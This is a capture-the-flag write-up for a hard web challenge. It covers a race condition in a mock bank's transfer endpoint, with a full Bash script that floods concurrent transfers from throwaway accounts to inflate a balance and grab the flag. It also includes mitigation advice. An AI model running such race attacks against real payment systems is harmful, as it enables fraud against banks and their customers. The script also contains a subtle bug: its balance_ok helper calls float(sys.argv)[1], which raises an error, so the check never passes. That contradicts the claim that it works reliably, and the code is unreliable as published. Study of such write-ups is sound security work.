# Challenge - Withdraw Under Pressure 

- Category: Web  
- Difficulty: Hard  

This challenge revolves around **Meridian Trust Bank**, a Flask‑based online banking app where each new account gets a \$100 welcome bonus, and “Premium Account Access” in the store costs \$500. The goal is to abuse a **race condition in the transfer logic** to boost a single account’s balance to at least \$500, buy premium access, and extract the flag. My solution automates the exploit entirely in Bash.

---

## 1. Challenge Overview

The web app exposes typical banking features:

- User registration and login.
- Balance check via `/balance` (JSON).
- Money transfers via `/transfer`.
- A store at `/store` with a premium item:
  - `premium_access` costs \$500.
- Purchasing via `/store/buy`:
  - On success (balance ≥ 500), returns a JSON payload that includes the flag.

Important application behaviors:

- Each new account starts with a **\$100 welcome bonus**.
- Transfers are done via `POST /transfer` with `to_user` and `amount`.
- Self‑transfers (to your own username) are blocked, but you can transfer freely between different users.
- There is **no rate limiting**, and the transfer logic is not protected by transactions or locks, creating a TOCTOU race window.

---

## 2. Root Cause: TOCTOU Race on Transfers

Server‑side transfer logic is conceptually:

```python
@app.route('/transfer', methods=['POST'])
def transfer():
    to_user = request.form['to_user']
    amount = float(request.form['amount'])

    sender = current_user()
    recipient = get_user_by_username(to_user)

    # TIME OF CHECK
    if sender.balance < amount:
        return jsonify({"error": "Insufficient funds"}), 400

    # --- RACE WINDOW ---
    # Multiple concurrent requests can all pass this check
    # before any balance deduction is committed.

    # TIME OF USE
    sender.balance -= amount
    recipient.balance += amount
    save(sender)
    save(recipient)

    return jsonify({"status": "success", "amount": amount, "to": to_user})
```

Because the check (`sender.balance < amount`) and the update (deduct/credit) are not atomic:

- Several concurrent requests can all **see the same initial balance** (e.g. \$100).
- They all pass the check.
- One or more may succeed in deducting and transferring funds that shouldn’t be available.
- In practice, at least one transfer beyond the “correct” balance gets through, especially under load.

Combined with the \$100 welcome bonus per account, we can create multiple accounts, race transfers into a chosen “destination” account, and then use that boosted balance to buy premium access.

---

## 3. My Exploit Script (Bash)

Here is the Bash script I used to reliably exploit the race and extract the flag:

```bash
#!/usr/bin/env bash
set -uo pipefail

BASE="TU HOST"
PASS="Passw0rd123!"

RUN_ID="$(date +%s)_$RANDOM"
DST="dst_$RUN_ID"
DST_COOKIE="c_dst_$RUN_ID.txt"

rm -f c_src_*.txt /tmp/mtb_race_*.out buy.json buy2.json store_after.html dashboard_after.html

echo "[+] Meridian Trust Bank exploit final"
echo "[+] BASE: $BASE"
echo "[+] Cuenta destino: $DST"
echo "[+] Cookie destino: $DST_COOKIE"

echo
echo "[+] Creando cuenta destino..."
curl -sk -c "$DST_COOKIE" -b "$DST_COOKIE" \
  -X POST "$BASE/register" \
  -d "username=$DST&password=$PASS" >/dev/null

get_balance() {
  curl -sk -b "$DST_COOKIE" "$BASE/balance" | python3 -c '
import sys, json
try:
    data = json.load(sys.stdin)
    print(float(data.get("balance", 0)))
except Exception:
    print(0.0)
'
}

balance_ok() {
  python3 - "$1" <<'PY'
import sys
balance = float(sys.argv)[1]
sys.exit(0 if balance >= 500 else 1)
PY
}

extract_flag() {
  grep -Eoi 'after\{[^}]+\}|ctf\{[^}]+\}|flag\{[^}]+\}|[A-Za-z0-9_]+\{[^}]+\}' "$@" 2>/dev/null | sort -u || true
}

BAL="$(get_balance)"
echo "[+] Balance inicial destino: $BAL"

ROUND=1

while true; do
  BAL="$(get_balance)"

  if balance_ok "$BAL"; then
    echo "[+] Balance suficiente: $BAL"
    break
  fi

  SRC="src_${RUN_ID}_${ROUND}_$RANDOM"
  SRC_COOKIE="c_src_${RUN_ID}_${ROUND}.txt"

  echo
  echo "[+] Round $ROUND"
  echo "[+] Creando cuenta origen: $SRC"

  curl -sk -c "$SRC_COOKIE" -b "$SRC_COOKIE" \
    -X POST "$BASE/register" \
    -d "username=$SRC&password=$PASS" >/dev/null

  echo "[+] Balance destino antes del race: $(get_balance)"
  echo "[+] Lanzando race hacia $DST usando to_user..."

  for i in $(seq 1 25); do
    curl -sk -b "$SRC_COOKIE" \
      -X POST "$BASE/transfer" \
      -d "to_user=$DST&amount=100" > "/tmp/mtb_race_${ROUND}_${i}.out" &
  done

  wait

  SUCCESS_COUNT="$(grep -h '"status":"success"' /tmp/mtb_race_${ROUND}_*.out 2>/dev/null | wc -l)"
  BAL="$(get_balance)"

  echo "[+] Transfers exitosos en este round: $SUCCESS_COUNT"
  echo "[+] Balance destino ahora: $BAL"

  ROUND=$((ROUND + 1))

  if [[ "$ROUND" -gt 8 ]]; then
    echo "[!] No se llego a 500. Ultimo balance: $BAL"
    echo "[!] Respuestas del ultimo race:"
    cat /tmp/mtb_race_*_*.out 2>/dev/null | sort -u
    exit 1
  fi
done

echo
echo "[+] Comprando Premium Account Access..."
curl -sk -b "$DST_COOKIE" \
  -X POST "$BASE/store/buy" \
  -d 'item=premium_access' | tee buy.json

echo
echo "[+] Intentando revelar certificado..."
curl -sk -b "$DST_COOKIE" \
  -X POST "$BASE/store/buy" \
  -d 'item=premium_access' | tee buy2.json

echo
echo "[+] Descargando paginas finales..."
curl -sk -b "$DST_COOKIE" "$BASE/store" -o store_after.html
curl -sk -b "$DST_COOKIE" "$BASE/dashboard" -o dashboard_after.html

echo
echo "[+] Balance final:"
curl -sk -b "$DST_COOKIE" "$BASE/balance"
echo

echo
echo "[+] Buscando flag..."
FLAG="$(extract_flag buy.json buy2.json store_after.html dashboard_after.html)"

if [[ -n "$FLAG" ]]; then
  echo
  echo "[+] FLAG ENCONTRADA:"
  echo "$FLAG"
else
  echo
  echo "[!] No encontre flag con regex. Mostrando respuestas:"
  echo
  echo "===== buy.json ====="
  cat buy.json
  echo
  echo "===== buy2.json ====="
  cat buy2.json
  echo
  echo "===== store grep ====="
  grep -nEi 'certificate|certificat|flag|after|ctf|premium|success|error|purchased' store_after.html || true
fi

echo
echo "[+] Datos usados:"
echo "    DST=$DST"
echo "    DST_COOKIE=$DST_COOKIE"
echo "    BALANCE=$(get_balance)"
```

Replace `BASE="TU HOST"` with the actual challenge URL before running.

---

## 4. Exploit Logic in Detail

### 4.1 Destination Account Creation

We first create a **destination account** where we want to accumulate money:

- Random username: `dst_<timestamp>_<random>`.
- Fixed password: `Passw0rd123!`.
- Cookies stored in `DST_COOKIE`.

This account starts at \$100 (welcome bonus).

```bash
curl -sk -c "$DST_COOKIE" -b "$DST_COOKIE" \
  -X POST "$BASE/register" \
  -d "username=$DST&password=$PASS"
```

`get_balance` is a helper that queries `/balance` and parses the JSON with Python, returning a floating‑point value.

### 4.2 Race Rounds: Pumping the Destination Balance

We loop until the destination balance is at least \$500, or up to 8 rounds:

1. Check current destination balance.
2. If `< 500`, create a **source account** for this round:
   - Username: `src_<RUN_ID>_<ROUND>_<random>`.
   - It gets \$100 welcome bonus.
3. From the source account, fire **25 concurrent transfer requests**:

   ```bash
   for i in $(seq 1 25); do
     curl -sk -b "$SRC_COOKIE" \
       -X POST "$BASE/transfer" \
       -d "to_user=$DST&amount=100" > "/tmp/mtb_race_${ROUND}_${i}.out" &
   done

   wait
   ```

   - Each request tries to send \$100 to the destination.
   - The source only has \$100, but due to the race condition, multiple transfers may be treated as valid.
   - Even if only a few “status":"success" responses occur, that is enough to raise the destination balance well above the intended limit.

4. After the race:

   - Count successful transfers via `grep '"status":"success"'`.
   - Recheck destination balance via `get_balance`.
   - If still `< 500`, start another round with a new source account.

The design ensures:

- Each round “injects” at least \$100 into the destination (under ideal race conditions, more).
- Multiple rounds compound until the destination has ≥ \$500.

### 4.3 Buying Premium and Extracting the Flag

Once `balance_ok` confirms the destination balance is ≥ 500, we:

1. Buy premium access:

   ```bash
   curl -sk -b "$DST_COOKIE" \
     -X POST "$BASE/store/buy" \
     -d 'item=premium_access' | tee buy.json
   ```

2. Send a second identical request, sometimes needed to reveal a “certificate” or final state:

   ```bash
   curl -sk -b "$DST_COOKIE" \
     -X POST "$BASE/store/buy" \
     -d 'item=premium_access' | tee buy2.json
   ```

3. Download final pages:

   ```bash
   curl -sk -b "$DST_COOKIE" "$BASE/store" -o store_after.html
   curl -sk -b "$DST_COOKIE" "$BASE/dashboard" -o dashboard_after.html
   ```

4. Search all collected responses for a flag‑shaped pattern:

   ```bash
   FLAG="$(extract_flag buy.json buy2.json store_after.html dashboard_after.html)"
   ```

`extract_flag` uses a regex that matches common flag formats:

- `after{...}`, `ctf{...}`, `flag{...}`, or `<WORD>{...}` with alphanumerics/underscore.

If found, it prints the flag; if not, it dumps the JSON and HTML snippets for manual inspection.

---

## 5. Why the Exploit Works

Key properties that make this exploitable:

- **Non‑atomic transfer logic**: The balance check and update are not in a single transaction, allowing multiple concurrent calls to slip through.
- **No per‑user rate limiting**: We can flood `/transfer` quickly with many parallel requests.
- **Welcome bonus per account**: Every new account adds \$100 of “capital” to the system, which we can direct to the destination via race‑amplified transfers.
- **Simple username‑based routing**: Transfers use `to_user` and rely on the currently logged‑in session for the sender, which we control via per‑account cookies.

In practice, this leads to the destination account’s balance being inflated beyond what the banking logic intends, letting us cross the \$500 threshold and buy premium access.

---

## 6. Mitigation Ideas

To fix such a vulnerability, a real banking system should:

- Wrap balance checks and updates in **database transactions with row locks** (`SELECT ... FOR UPDATE`), or equivalent ORM transactional semantics.
- Use **application‑level mutexes** per account if DB‑level locking is not available.
- Implement **optimistic concurrency control** (version field / CAS) to detect concurrent updates.
- Introduce **rate limiting** on financial endpoints like `/transfer`.
- Add **server‑side validation** on `amount` and other parameters and robust logging for auditing.

---

## 7. Summary of Exploit Flow

1. Create a destination account with \$100.
2. In repeated rounds:
   - Create a fresh source account with \$100.
   - Fire 25 concurrent transfers of \$100 from source to destination.
   - Let the race condition boost the destination balance.
3. Stop once the destination has ≥ \$500.
4. Use the destination account to `POST /store/buy` with `item=premium_access`.
5. Parse responses and pages to locate the flag with a regex.

All of this is automated in the Bash script above, making **Withdraw Under Pressure** a neat showcase of how race conditions in financial operations can be exploited to break business logic guarantees.
